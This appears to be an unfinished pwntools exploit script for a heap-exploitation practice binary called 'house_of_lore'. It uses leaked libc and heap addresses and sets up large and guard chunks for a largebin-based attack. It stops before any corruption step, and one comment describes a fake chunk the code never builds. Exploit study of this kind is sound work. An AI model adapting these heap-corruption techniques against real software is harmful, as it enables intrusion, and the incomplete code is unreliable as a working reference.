#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("house_of_lore")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)

# =============================================================================

# Craft a fake 0x400-sized chunk in the username field, which preceeds the target data.
# Ensure its fd & bk point to itself to satisfy safe unlinking.
username = b"A"*8
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# 1. Request 2 large chunks (A & B).
chunk_A = malloc(0x3f8)

# 2. Request a guard chunk, to prevent consolidation of chunk A & B.
#    Size doesn't matter here.
malloc(0x88)

chunk_B = malloc(0x3f8)

# 3. Request a guard chunk, to prevent consolidation of chunk B with top chunk after
#    freeing it.
#    Size doesn't matter here.
malloc(0x88)

# 4. Free chunk A & B for getting them included into the unsortedbin.
free(chunk_A)
free(chunk_B)

# 5. Sort into largebin.
malloc(0x400)



# =============================================================================

io.interactive()
